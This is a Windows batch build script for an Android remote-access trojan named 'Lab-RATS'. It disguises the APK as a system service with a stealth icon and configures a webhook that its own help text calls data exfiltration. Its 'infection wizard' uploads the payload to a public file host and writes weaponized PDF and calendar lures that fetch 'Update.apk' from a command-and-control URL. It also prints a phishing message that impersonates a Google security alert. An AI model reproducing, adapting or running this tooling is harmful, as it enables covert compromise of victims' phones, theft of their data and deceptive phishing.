@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul 2>&1

REM #################################################
REM          Lab-RATS APK BUILDER - Windows
REM                   v1.4.5 Hardened
REM
REM  Developed by: Lab-RATS.LABS
REM  GitHub: https://github.com/K4N3CO-LABS/Lab-RATS
#################################################

title Lab-RATS APK Builder v1.4.5 - by Lab-RATS.LABS

REM Get script directory
set "SCRIPT_DIR=%~dp0"
set "PROJECT_DIR=%SCRIPT_DIR%.."
set "CONFIG_FILE=%SCRIPT_DIR%build_config.txt"
set "DEFAULT_LOGO=%PROJECT_DIR%\assets\app_logo.png"
set "COVERT_LOGO=%PROJECT_DIR%\assets\default_app_icon.png"

goto :main_menu

:print_banner
cls
echo [96m ┌──────────────────────────────────────────────────────────────┐[0m
echo [96m │                                                              │[0m
echo [96m │  ██╗  ██╗██╗  ██╗███╗   ██╗██████╗  ██████╗  ██████╗         │[0m
echo [96m │  ██║ ██╔╝██║  ██║████╗  ██║╚════██╗██╔════╝ ██╔═══██╗        │[0m
echo [96m │  █████╔╝ ███████║██╔██╗ ██║ █████╔╝██║      ██║   ██║        │[0m
echo [96m │  ██╔═██╗ ╚════██║██║╚██╗██║ ╚═══██╗██║      ██║   ██║        │[0m
echo [96m │  ██║  ██╗     ██║██║ ╚████║██████╔╝╚██████╗ ╚██████╔╝        │[0m
echo [96m │  ╚═╝  ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝         │[0m
echo [96m │                                                              │[0m
echo [96m │ PROJECT: Lab-RATS APK Builder | v1.4.5 Hardened              │[0m
echo [96m │ GIT_UPLINK: https://github.com/K4N3CO-LABS/Lab-RATS           │[0m
echo [96m │                                                              │[0m
echo [96m └──────────────────────────────────────────────────────────────┘[0m
echo.
goto :eof

:check_requirements
echo [96m[*] Checking requirements...[0m
echo.

REM Check Java
where java >nul 2>nul
if %errorlevel% neq 0 (
    echo [91m[!] Java is not installed.[0m
    echo.
    echo [95m[^>] Options:[0m
    echo     1. Auto-install Java (download from web)
    echo     2. Show manual installation instructions
    echo     3. Skip (I'll install later)
    echo.
    set /p "JAVA_OPTION=    Choose option (Default 2): "
    if "!JAVA_OPTION!"=="" set "JAVA_OPTION=2"
    
    if "!JAVA_OPTION!"=="1" (
        call :install_java
    ) else if "!JAVA_OPTION!"=="2" (
        call :show_manual_java_install
        pause
        exit /b 1
    ) else (
        echo [93m[!] Skipping Java check. Build may fail.[0m
    )
) else (
    for /f "tokens=3" %%g in ('java -version 2^>^&1 ^| findstr /i "version"') do (
        echo [92m[✓] Java found: %%g[0m
    )
)

REM Check keytool
where keytool >nul 2>nul
if %errorlevel% equ 0 (
    echo [92m[✓] keytool found[0m
) else (
    echo [93m[!] keytool not found. Usually comes with JDK.[0m
)

echo.
goto :eof

:install_java
echo [96m[*] Opening Java download page...[0m
echo [93m    Please download and install JDK 11 or higher from:[0m
echo     https://adoptium.net/temurin/releases/
echo.
start "" "https://adoptium.net/temurin/releases/"
echo [93m[!] After installing Java, restart this script.[0m
pause
exit /b 1

:show_manual_java_install
echo.
echo [96m╔══════════════════════════════════════════════════════════════╗[0m
echo [96m║              MANUAL JAVA INSTALLATION GUIDE                  ║[0m
echo [96m╚══════════════════════════════════════════════════════════════╝[0m
echo.
echo [97mOption 1: Download from Adoptium (Recommended)[0m
echo     1. Go to: https://adoptium.net/temurin/releases/
echo     2. Download "JDK 11" or "JDK 17" for Windows x64
echo     3. Run the installer (choose "Add to PATH")
echo     4. Restart this script
echo.
echo [97mOption 2: Using winget (Windows 11)[0m
echo     winget install EclipseAdoptium.Temurin.11.JDK
echo.
echo [97mOption 3: Using Chocolatey[0m
echo     choco install temurin11
echo.
echo [97mOption 4: Using Scoop[0m
echo     scoop bucket add java
echo     scoop install temurin11-jdk
echo.
goto :eof

:generate_keystore
set "KEYSTORE_PATH=%PROJECT_DIR%\lab-rats-keystore.jks"

REM Default values
set "KEY_ALIAS=lab-rats-key"
set "KEYSTORE_PASS=lab-rats123"
set "CN_NAME=Lab-RATS Developer"
set "ORG_NAME=Lab-RATS.LABS"
set "COUNTRY=US"
set "VALIDITY_DAYS=9125"

if exist "%KEYSTORE_PATH%" (
    if "%AUTO_KEYSTORE%"=="1" (
        echo [92m[OK] Keystore already exists[0m
        goto :eof
    )
    echo [93m[!] Keystore already exists at: %KEYSTORE_PATH%[0m
    set /p "REGENERATE=    Generate new keystore? (y/N): "
    if /i not "!REGENERATE!"=="y" (
        echo [92m[OK] Using existing keystore[0m
        goto :eof
    )
    del "%KEYSTORE_PATH%" >nul 2>nul
)

if not "%AUTO_KEYSTORE%"=="1" (
    echo [96m[*] Keystore Configuration[0m
    echo.
    echo [95m[^>] Enter keystore details (press Enter for defaults):[0m
    echo.
    set /p "KEY_ALIAS=    Key alias [lab-rats-key]: "
    if "!KEY_ALIAS!"=="" set "KEY_ALIAS=lab-rats-key"
    set /p "KEYSTORE_PASS=    Keystore password [lab-rats123]: "
    if "!KEYSTORE_PASS!"=="" set "KEYSTORE_PASS=lab-rats123"
    set /p "CN_NAME=    Your name [Lab-RATS Developer]: "
    if "!CN_NAME!"=="" set "CN_NAME=Lab-RATS Developer"
    set /p "ORG_NAME=    Organization [Lab-RATS.LABS]: "
    if "!ORG_NAME!"=="" set "ORG_NAME=Lab-RATS.LABS"
    set /p "COUNTRY=    Country code [US]: "
    if "!COUNTRY!"=="" set "COUNTRY=US"
) else (
    echo [96m[*] Auto-generating keystore with default values...[0m
)

echo.
echo [96m[*] Generating keystore...[0m

keytool -genkeypair -alias "!KEY_ALIAS!" -keyalg RSA -keysize 2048 -validity !VALIDITY_DAYS! -keystore "%KEYSTORE_PATH%" -storepass "!KEYSTORE_PASS!" -keypass "!KEYSTORE_PASS!" -dname "CN=!CN_NAME!, O=!ORG_NAME!, C=!COUNTRY!" 2>nul

if %errorlevel% equ 0 (
    echo [92m[OK] Keystore generated successfully![0m
    echo.
    
    REM Create keystore.properties for Gradle
    set "KEYSTORE_PROPS=%PROJECT_DIR%\keystore.properties"
    echo storeFile=lab-rats-keystore.jks> "!KEYSTORE_PROPS!"
    echo storePassword=!KEYSTORE_PASS!>> "!KEYSTORE_PROPS!"
    echo keyAlias=!KEY_ALIAS!>> "!KEYSTORE_PROPS!"
    echo keyPassword=!KEYSTORE_PASS!>> "!KEYSTORE_PROPS!"
    echo [92m[OK] Created keystore.properties for Gradle[0m
    
    REM Save to config
    echo KEYSTORE_PATH=%KEYSTORE_PATH%> "%CONFIG_FILE%"
    echo KEY_ALIAS=!KEY_ALIAS!>> "%CONFIG_FILE%"
    echo KEYSTORE_PASS=!KEYSTORE_PASS!>> "%CONFIG_FILE%"
    
    if not "%AUTO_KEYSTORE%"=="1" (
        REM Show certificate info
        echo [96m[*] Certificate fingerprint:[0m
        keytool -list -v -keystore "%KEYSTORE_PATH%" -storepass "!KEYSTORE_PASS!" -alias "!KEY_ALIAS!" 2>nul | findstr "SHA256:"
        echo.
    )
) else (
    echo [91m[!] Failed to generate keystore[0m
    if not "%AUTO_KEYSTORE%"=="1" pause
    exit /b 1
)
goto :eof

:configure_logo
echo [96m[*] Logo Configuration[0m
echo.

set "RES_DIR=%PROJECT_DIR%\app\src\main\res"

echo [95m[^>] Logo options:[0m
echo     1. Use Recommended System-Style Stealth logo (default_app_icon.png)
echo     2. Use default Lab-RATS logo (app_logo.png)
echo     3. Use custom logo (provide image path)
echo     4. Skip (Keep project icons as is)
echo.
set /p "LOGO_OPTION=    Choose option (Default 1): "
if "!LOGO_OPTION!"=="" set "LOGO_OPTION=1"

set "LOGO_PATH="

if "!LOGO_OPTION!"=="1" (
    if exist "%COVERT_LOGO%" (
        set "LOGO_PATH=%COVERT_LOGO%"
        echo [92m[✓] Using System-Style Stealth logo[0m
    ) else (
        echo [91m[!] Stealth logo not found at: %COVERT_LOGO%[0m
        goto :logo_done
    )
) else if "!LOGO_OPTION!"=="2" (
    if exist "%DEFAULT_LOGO%" (
        set "LOGO_PATH=%DEFAULT_LOGO%"
        echo [92m[✓] Using default Lab-RATS logo[0m
    ) else (
        echo [91m[!] Default logo not found at: %DEFAULT_LOGO%[0m
        goto :logo_done
    )
) else if "!LOGO_OPTION!"=="3" (
    set /p "CUSTOM_LOGO=    Enter path to logo image (PNG, 512x512): "
    if exist "!CUSTOM_LOGO!" (
        set "LOGO_PATH=!CUSTOM_LOGO!"
    ) else (
        echo [91m[!] Logo file not found: !CUSTOM_LOGO![0m
        goto :logo_done
    )
) else (
    echo [92m[✓] No changes made to icons[0m
    goto :logo_done
)

if not "!LOGO_PATH!"=="" (
    echo.
    set /p "TRANSPARENT=    Make background transparent? (y/N): "
    
    echo [96m[*] Processing logo...[0m
    
    REM KEY FIX: Remove adaptive icon definitions and any existing launcher icons to prevent duplicates
    if exist "%RES_DIR%\mipmap-anydpi-v26" (
        rmdir /s /q "%RES_DIR%\mipmap-anydpi-v26"
        echo [93m[*] Removed adaptive icon config (forced legacy mode for PNG)[0m
    )

    REM Remove existing icons to prevent duplicate extension errors (png vs webp)
    for %%D in (mipmap-mdpi mipmap-hdpi mipmap-xhdpi mipmap-xxhdpi mipmap-xxxhdpi) do (
        del /f /q "%RES_DIR%\%%D\ic_launcher.png" 2>nul
        del /f /q "%RES_DIR%\%%D\ic_launcher.webp" 2>nul
        del /f /q "%RES_DIR%\%%D\ic_launcher_round.png" 2>nul
        del /f /q "%RES_DIR%\%%D\ic_launcher_round.webp" 2>nul
        del /f /q "%RES_DIR%\%%D\ic_launcher_foreground.png" 2>nul
        del /f /q "%RES_DIR%\%%D\ic_launcher_foreground.webp" 2>nul
    )
    echo [93m[*] Cleaned up old icon resources[0m

    REM Check for ImageMagick (magick command)
    where magick >nul 2>nul
    if %errorlevel% equ 0 (
        echo [93m[!] Using ImageMagick for resizing...[0m
        
        REM Helper function to resize
        call :resize_logo "!LOGO_PATH!" 48 "%RES_DIR%\mipmap-mdpi"
        call :resize_logo "!LOGO_PATH!" 72 "%RES_DIR%\mipmap-hdpi"
        call :resize_logo "!LOGO_PATH!" 96 "%RES_DIR%\mipmap-xhdpi"
        call :resize_logo "!LOGO_PATH!" 144 "%RES_DIR%\mipmap-xxhdpi"
        call :resize_logo "!LOGO_PATH!" 192 "%RES_DIR%\mipmap-xxxhdpi"
        
        if /i "!TRANSPARENT!"=="y" (
             echo [96m[*] Applying transparency...[0m
             call :transparent_logo "%RES_DIR%\mipmap-mdpi"
             call :transparent_logo "%RES_DIR%\mipmap-hdpi"
             call :transparent_logo "%RES_DIR%\mipmap-xhdpi"
             call :transparent_logo "%RES_DIR%\mipmap-xxhdpi"
             call :transparent_logo "%RES_DIR%\mipmap-xxxhdpi"
             echo [92m[✓] Transparency applied[0m
        )
        echo [92m[✓] Logo resized and copied to all densities[0m
    ) else (
        echo [93m[!] ImageMagick not found. Falling back to simple copy.[0m
        echo [93m    Note: Install ImageMagick to enable resizing and transparency.[0m
        
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-mdpi\ic_launcher.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-hdpi\ic_launcher.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xhdpi\ic_launcher.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xxhdpi\ic_launcher.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xxxhdpi\ic_launcher.png" >nul
        
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-mdpi\ic_launcher_round.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-hdpi\ic_launcher_round.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xhdpi\ic_launcher_round.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xxhdpi\ic_launcher_round.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xxxhdpi\ic_launcher_round.png" >nul
        
        echo [92m[✓] Logo copied (No resize)[0m
    )
)

goto :logo_done

:resize_logo
if not exist "%~3" mkdir "%~3"
REM Apply 125% Zoom and Container Fix for Stealth Logo (Option 1)
if "%LOGO_OPTION%"=="1" (
    REM 1. Trim edges with fuzz 30% to preserve grey gear
    REM 2. Set scale to 125% to "Zoom In" (Crop Zoom)
    REM 3. Force transparency to kill the white box
    magick convert "%~1" -fuzz 30%% -trim +repage -resize 125%% -background transparent -gravity center -extent %2x%2 "%~3\ic_launcher.png"
    magick convert "%~1" -fuzz 30%% -trim +repage -resize 125%% -background transparent -gravity center -extent %2x%2 "%~3\ic_launcher_round.png"
) else (
    magick convert "%~1" -trim +repage -resize %2x%2 "%~3\ic_launcher.png"
    magick convert "%~1" -trim +repage -resize %2x%2 "%~3\ic_launcher_round.png"
)
goto :eof

:transparent_logo
magick convert "%~1\ic_launcher.png" -transparent white "%~1\ic_launcher.png"
magick convert "%~1\ic_launcher_round.png" -transparent white "%~1\ic_launcher_round.png"
goto :eof

:logo_done
echo.
goto :eof

:configure_app
echo [96m[*] App Configuration[0m
echo.

set "STRINGS_FILE=%PROJECT_DIR%\app\src\main\res\values\strings.xml"
set "BUILD_GRADLE=%PROJECT_DIR%\app\build.gradle"

REM Generate random defaults for stealth
set /a RAND_MAJOR=%RANDOM% %% 4 + 1
set /a RAND_MINOR=%RANDOM% %% 10
set /a RAND_PATCH=%RANDOM% %% 10
set "DEF_VER=!RAND_MAJOR!.!RAND_MINOR!.!RAND_PATCH!"
set "DEF_SDK=26"

REM App Name
echo [95m[^>] Enter App Name [System Stability Service]:[0m
set /p "APP_NAME=    "
if "!APP_NAME!"=="" set "APP_NAME=System Stability Service"

REM Package Name
echo [95m[^>] Enter Package Name (Application ID) [com.android.system.stability]:[0m
set /p "PKG_NAME=    "
if "!PKG_NAME!"=="" set "PKG_NAME=com.android.system.stability"

REM Version Name
echo [95m[^>] Enter Version Name [!DEF_VER!]:[0m
set /p "VERSION_NAME=    "
if "!VERSION_NAME!"=="" set "VERSION_NAME=!DEF_VER!"

REM Min SDK
echo [95m[^>] Enter Min SDK [!DEF_SDK!]:[0m
set /p "MIN_SDK=    "
if "!MIN_SDK!"=="" set "MIN_SDK=!DEF_SDK!"

REM Update build.gradle using PowerShell for reliability with regex replacement
if exist "%BUILD_GRADLE%" (
    REM Update Application ID
    powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'applicationId \"[^\"]+\"', 'applicationId \"!PKG_NAME!\"' | Set-Content '%BUILD_GRADLE%'"
    
    REM Update Min SDK
    powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'minSdk \d+', 'minSdk !MIN_SDK!' | Set-Content '%BUILD_GRADLE%'"
    
    REM Update Version Code (auto increment or random)
    set /a "VERSION_CODE=!RANDOM! %% 1000 + 10"
    powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'versionCode [0-9]+', 'versionCode !VERSION_CODE!' | Set-Content '%BUILD_GRADLE%'"

    REM Update Version Name
    powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'versionName \".*\"', 'versionName \"!VERSION_NAME!\"' | Set-Content '%BUILD_GRADLE%'"
    
    echo [92m[✓] build.gradle updated (Pkg: !PKG_NAME!, MinSdk: !MIN_SDK!, Ver: !VERSION_NAME!)[0m
)

REM Update strings.xml
if exist "%STRINGS_FILE%" (
    powershell -Command "(Get-Content '%STRINGS_FILE%') -replace '<string name=\"app_name\">.*</string>', '<string name=\"app_name\">!APP_NAME!</string>' | Set-Content '%STRINGS_FILE%'"
    echo [92m[✓] App name set to: !APP_NAME![0m
)

REM Save to config
echo APP_NAME="!APP_NAME!"> "%CONFIG_FILE%"
echo VERSION_NAME="!VERSION_NAME!">> "%CONFIG_FILE%"
echo MIN_SDK="!MIN_SDK!">> "%CONFIG_FILE%"
echo PKG_NAME="!PKG_NAME!">> "%CONFIG_FILE%"

REM Google Sheet URL
echo.
echo [95m[^>] Google Sheet Webhook Configuration[0m
echo [93m    Enter Webhook URL (Google Script):[0m
set /p "WEB_URL=    "

set "LOCAL_PROPS=%PROJECT_DIR%\local.properties"
if not "!WEB_URL!"=="" (
    REM Update local.properties for Gradle
    powershell -Command "if (Test-Path '!LOCAL_PROPS!') { $content = Get-Content '!LOCAL_PROPS!'; if ($content -match 'WEBHOOK_URL=') { $content -replace 'WEBHOOK_URL=.*', 'WEBHOOK_URL=!WEB_URL!' | Set-Content '!LOCAL_PROPS!' } else { Add-Content '!LOCAL_PROPS!' 'WEBHOOK_URL=!WEB_URL!' } } else { Set-Content '!LOCAL_PROPS!' 'WEBHOOK_URL=!WEB_URL!' }"
    echo [92m[✓] Webhook URL saved to local.properties[0m
)

echo.
goto :eof

:build_apk
call :print_banner
echo [96m[*] Initializing Build Engine...[0m
echo.

cd /d "%PROJECT_DIR%"

REM Load config if exists
if exist "%CONFIG_FILE%" (
    for /f "usebackq tokens=1,2 delims==" %%a in ("%CONFIG_FILE%") do (
        set "val=%%b"
        REM Remove quotes if present
        set "val=!val:"=!"
        set "%%a=!val!"
    )
)

REM Check if keystore exists - auto-generate if not
set "KEYSTORE_FILE=%PROJECT_DIR%\lab-rats-keystore.jks"
if not exist "!KEYSTORE_FILE!" (
    echo [93m[!] No keystore found. Auto-generating...[0m
    set "AUTO_KEYSTORE=1"
    call :generate_keystore
    set "AUTO_KEYSTORE="
    echo.
)

REM Create output folder
set "OUTPUT_DIR=%SCRIPT_DIR%output"
if not exist "!OUTPUT_DIR!" mkdir "!OUTPUT_DIR!"

REM Generate timestamp
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set "TIMESTAMP=!datetime:~0,8!_!datetime:~8,6!"

REM Create safe app name
set "APP_NAME_SAFE=!APP_NAME: =_!"
if "!APP_NAME_SAFE!"=="" set "APP_NAME_SAFE=System_Stability_Service"
if "!VERSION_NAME!"=="" set "VERSION_NAME=2.0"

set "APK_FOUND=0"

REM ---------------------------------------------------------
REM 1. Build Signed APK
REM ---------------------------------------------------------
echo [94m[1/2] Generating Signed Production APK[0m
set "TASK_LABEL=Compiling Resources & Signing"
echo | set /p="    [*] !TASK_LABEL! ["
start /b cmd /c "gradlew.bat clean assembleRelease --no-daemon > build_log.txt 2>&1"
set "PID=$!"

REM Simulate progress with Finalizing detection
for /L %%i in (1,1,38) do (
    set /a "percent=%%i * 100 / 40"
    echo | set /p="█"
    timeout /t 1 >nul
)
echo | set /p="] 95%% [93m[FINALIZING...][0m"

:wait_signed
REM Fast loop using ping for sub-second delay
ping 127.0.0.1 -n 1 -w 500 >nul
tasklist /fi "imagename eq java.exe" | find ":" >nul
if errorlevel 1 goto wait_signed
echo.
echo     [92m[DONE][0m

REM Signed release APK
set "RELEASE_APK=%PROJECT_DIR%\app\build\outputs\apk\release\app-release.apk"
if exist "!RELEASE_APK!" (
    set "OUTPUT_SIGNED=!OUTPUT_DIR!\!APP_NAME_SAFE!-v!VERSION_NAME!-signed.apk"
    copy /Y "!RELEASE_APK!" "!OUTPUT_SIGNED!" >nul
    echo     [92m[✓] Saved: !APP_NAME_SAFE!-v!VERSION_NAME!-signed.apk[0m
    set "APK_FOUND=1"
) else (
    echo     [91m[!] Signed APK generation failed. Check build_log.txt[0m
)

echo.

REM ---------------------------------------------------------
REM 2. Build Unsigned APK
REM ---------------------------------------------------------
echo [94m[2/2] Generating Unsigned Debug APK[0m
set "TASK_LABEL=Packaging Assets"
echo | set /p="    [*] !TASK_LABEL! ["
start /b cmd /c "gradlew.bat assembleRelease -PdisableSigning --no-daemon > build_log.txt 2>&1"

for /L %%i in (1,1,38) do (
    set /a "percent=%%i * 100 / 40"
    echo | set /p="█"
    timeout /t 1 >nul
)
echo | set /p="] 95%% [93m[FINALIZING...][0m"

:wait_unsigned
ping 127.0.0.1 -n 1 -w 500 >nul
tasklist /fi "imagename eq java.exe" | find ":" >nul
if errorlevel 1 goto wait_unsigned
echo.
echo     [92m[DONE][0m

REM Unsigned release APK
set "UNSIGNED_APK=%PROJECT_DIR%\app\build\outputs\apk\release\app-release-unsigned.apk"

REM Fallback check
if not exist "!UNSIGNED_APK!" (
    set "UNSIGNED_APK_FALLBACK=%PROJECT_DIR%\app\build\outputs\apk\release\app-release.apk"
    if exist "!UNSIGNED_APK_FALLBACK!" set "UNSIGNED_APK=!UNSIGNED_APK_FALLBACK!"
)

if exist "!UNSIGNED_APK!" (
    set "OUTPUT_UNSIGNED=!OUTPUT_DIR!\!APP_NAME_SAFE!-v!VERSION_NAME!-unsigned.apk"
    copy /Y "!UNSIGNED_APK!" "!OUTPUT_UNSIGNED!" >nul
    echo     [92m[✓] Saved: !APP_NAME_SAFE!-v!VERSION_NAME!-unsigned.apk[0m
    set "APK_FOUND=1"
) else (
    echo     [91m[!] Unsigned APK generation failed. Check build_log.txt[0m
)

if "!APK_FOUND!"=="0" (
    echo.
    echo [91m╔══════════════════════════════════════════════════════════════╗[0m
    echo [91m║                      BUILD FAILED!                           ║[0m
    echo [91m╚══════════════════════════════════════════════════════════════╝[0m
    echo.
    echo [91m[!] No APK files found. Check errors in build_log.txt[0m
    pause
    exit /b 1
)

echo.
echo [92m╔══════════════════════════════════════════════════════════════╗[0m
echo [92m║                    BUILD SUCCESSFUL!                         ║[0m
echo [92m╚══════════════════════════════════════════════════════════════╝[0m
echo.
echo [92m[✓] APKs saved to: !OUTPUT_DIR![0m
echo.
goto :eof

:main_menu
call :print_banner

echo [95m[^>] Build Options:[0m
echo.
echo     1. Start Build (Configure & Build)
echo     2. Generate Keystore Only
echo     3. Configure Logo Only
echo     4. Configure App Settings Only
echo     5. Check/Install Requirements
echo     6. Generate Infection Chain Package (Wizard)
echo     7. Help / Documentation
echo     8. Exit
echo.
set /p "MENU_OPTION=    Choose option (Default 1): "
if "!MENU_OPTION!"=="" set "MENU_OPTION=1"

echo.

if "!MENU_OPTION!"=="1" (
    call :check_requirements
    call :generate_keystore
    call :configure_logo
    call :configure_app
    call :build_apk
) else if "!MENU_OPTION!"=="2" (
    call :check_requirements
    call :generate_keystore
) else if "!MENU_OPTION!"=="3" (
    call :configure_logo
) else if "!MENU_OPTION!"=="4" (
    call :configure_app
) else if "!MENU_OPTION!"=="5" (
    call :check_requirements
    call :show_manual_java_install
) else if "!MENU_OPTION!"=="6" (
    call :infection_wizard
) else if "!MENU_OPTION!"=="7" (
    call :show_help
) else if "!MENU_OPTION!"=="8" (
    echo [96m[*] Goodbye![0m
    echo [95m    Follow: https://github.com/K4N3CO-LABS/Lab-RATS[0m
    exit /b 0
) else (
    echo [91m[!] Invalid option[0m
    pause
    exit /b 1
)

echo.
echo [92m[✓] Done![0m
echo.
pause
goto :eof

:show_help
call :print_banner
echo [97mCOMMAND_DOCUMENTATION_V1.4.5[0m
echo ------------------------------------------------------------
echo [96m1. Start Build:[0m Full automated process. Configures everything
echo    and produces a signed APK ready for installation.
echo.
echo [96m2. Keystore Only:[0m Generates a unique security certificate
echo    used to sign the APK. Prevents Play Protect flags.
echo.
echo [96m3. Logo Only:[0m Injects custom icons into the APK. Use the
echo    'Stealth' option to hide as a system service.
echo.
echo [96m4. App Settings:[0m Change Package ID, App Name, and set
echo    your Webhook URL for data exfiltration.
echo.
echo [96m5. Requirements:[0m Verifies Java/JDK and ImageMagick setup.
echo.
echo [96m6. Infection Wizard:[0m The most powerful tool. It builds your
echo    APK, hosts it anonymously, weaponizes a PDF/MP4 with the
echo    link, and writes your phishing message. Full-chain auto.
echo ------------------------------------------------------------
pause
goto :main_menu
goto :eof

:infection_wizard
call :print_banner
echo [91m[>] STRATEGIC_INFECTION_WIZARD[0m
echo [93m    Step-by-step automated payload weaponization.[0m
echo.

REM 1. Build Payload
echo [96m[1/4] Building Stealth APK...[0m
call :check_requirements
set "AUTO_KEYSTORE=1"
call :generate_keystore
call :configure_logo
call :configure_app
call :build_apk

REM Identify APK
for /f "delims=" %%i in ('dir /b /s "%SCRIPT_DIR%output\*-signed.apk"') do set "SIGNED_APK=%%i"
if not exist "!SIGNED_APK!" (
    echo [91m[!] Build failed. Infection chain aborted.[0m
    pause
    goto :main_menu
)

REM 2. Host Payload
echo.
echo [96m[2/4] Hosting Payload for Bootstrap...[0m
set "DOWNLOAD_URL="
echo [93m[*] Uploading to Catbox.moe...[0m
powershell -Command "$resp = curl.exe -F 'reqtype=fileupload' -F 'fileToUpload=@!SIGNED_APK!' https://catbox.moe/user/api.php; if($resp -match 'http') { echo $resp } else { exit 1 }" > temp_url.txt
set /p DOWNLOAD_URL=<temp_url.txt
del temp_url.txt
if "!DOWNLOAD_URL!"=="" (
    echo [91m[!] Auto-hosting failed. Manual hosting required.[0m
    set /p "DOWNLOAD_URL=    Enter your manual download link: "
) else (
    echo [92m[✓] Hosted Successfully: !DOWNLOAD_URL![0m
)

REM 3. Weaponize
echo.
echo [96m[3/4] Weaponizing Delivery Vehicle...[0m
echo      1. Zero-Click MP4 (Media Payload)
echo      2. Stealth PDF (Document Payload)
echo      3. Meeting Invite (Calendar Payload)
echo.
set /p "VECTOR=      Select Vector (Default 1): "
if "!VECTOR!"=="" set "VECTOR=1"

if "!VECTOR!"=="1" (
    call :generate_exploit_standalone "mp4" "!DOWNLOAD_URL!"
) else if "!VECTOR!"=="2" (
    call :generate_exploit_standalone "pdf" "!DOWNLOAD_URL!"
) else if "!VECTOR!"=="3" (
    call :generate_exploit_standalone "ics" "!DOWNLOAD_URL!"
)

REM 4. Phishing Deployment
echo.
echo [96m[4/4] Deployment Sequence Generated[0m
echo [92m------------------------------------------------------------[0m
echo [97mPHISHING TEMPLATE:[0m
echo Target: WhatsApp / SMS
echo Message: (SYSTEM ALERT) Unauthorized sign-in attempt on your Google account. To secure your device and review details, download the system patch here: !DOWNLOAD_URL!
echo [92m------------------------------------------------------------[0m
echo.
echo [93m[*] All files ready in apk-builder\output\ folder.[0m
pause
goto :main_menu
goto :eof

:exploit_menu
call :print_banner
echo [95m[^>] Weaponized Payload Lab (Es-rat Tier)[0m
echo.
echo     1. Generate Zero-Click MP4 (Heap Overflow)
echo     2. Generate PDF JavaScript (Auto-Download)
echo     3. Generate Calendar Injection (.ics)
echo     4. Generate PWA WebAPK Manifest
echo     5. Back to Main Menu
echo.
set /p "EXPLOIT_OPTION=    Choose option (Default 1): "
if "!EXPLOIT_OPTION!"=="" set "EXPLOIT_OPTION=1"

set "C2_URL=http://127.0.0.1:8080"

if "!EXPLOIT_OPTION!"=="1" (
    call :generate_exploit_standalone "mp4" ""
) else if "!EXPLOIT_OPTION!"=="2" (
    set /p "TITLE=    Enter PDF Title [URGENT_DOCUMENT]: "
    if "!TITLE!"=="" set "TITLE=URGENT_DOCUMENT"
    call :generate_exploit_standalone "pdf" "!TITLE!"
) else if "!EXPLOIT_OPTION!"=="3" (
    set /p "SUMMARY=    Enter Meeting Summary [Meeting_Invite]: "
    if "!SUMMARY!"=="" set "SUMMARY=Meeting_Invite"
    call :generate_exploit_standalone "ics" "!SUMMARY!"
) else if "!EXPLOIT_OPTION!"=="4" (
    call :generate_exploit_standalone "pwa" ""
) else if "!EXPLOIT_OPTION!"=="5" (
    goto :main_menu
)
goto :exploit_menu

:generate_exploit_standalone
set "TYPE=%~1"
set "EXTRA=%~2"

REM Get C2 URL
set "C2_URL=http://127.0.0.1:8080"
if exist "%CONFIG_FILE%" (
    for /f "usebackq tokens=1,2 delims==" %%a in ("%CONFIG_FILE%") do (
        if "%%a"=="SHEET_URL" set "C2_URL=%%b"
    )
)

echo [96m[*] Compiling Exploit Generator...[0m
set "EXPLOIT_SRC=%PROJECT_DIR%\app\src\main\java\com\labs\labrats\exploits\ExploitLab.java"
set "TEMP_BIN=%SCRIPT_DIR%bin"
if not exist "!TEMP_BIN!" mkdir "!TEMP_BIN!"

javac -d "!TEMP_BIN!" "!EXPLOIT_SRC!" 2>nul

if %errorlevel% equ 0 (
    echo [92m[✓] Engine Ready. Producing payload...[0m
    cd /d "%SCRIPT_DIR%output"
    java -cp "!TEMP_BIN!" com.labs.labrats.exploits.ExploitLab !TYPE! !C2_URL! "!EXTRA!"
    cd /d "%SCRIPT_DIR%"
) else (
    echo [91m[!] Advanced binary crafting requires full JDK environment.[0m
    echo [93m[*] Falling back to template generation...[0m

    if "!TYPE!"=="pdf" (
        echo %%PDF-1.4> "output\exploit.pdf"
        echo 1 0 obj ^<^< /Type /Catalog /OpenAction ^<^< /S /JavaScript /JS (app.launchURL("!C2_URL!/download/Update.apk");) ^>^> ^>^> endobj>> "output\exploit.pdf"
        echo [92m[✓] Saved to output\exploit.pdf[0m
    ) else if "!TYPE!"=="ics" (
        echo BEGIN:VCALENDAR> "output\invite.ics"
        echo SUMMARY:!EXTRA!>> "output\invite.ics"
        echo DESCRIPTION:Download: !C2_URL!/l/meeting>> "output\invite.ics"
        echo END:VCALENDAR>> "output\invite.ics"
        echo [92m[✓] Saved to output\invite.ics[0m
    ) else (
        echo [91m[!] Binary exploits (MP4/Stego) require Java compilation.[0m
    )
)
echo.
pause
goto :eof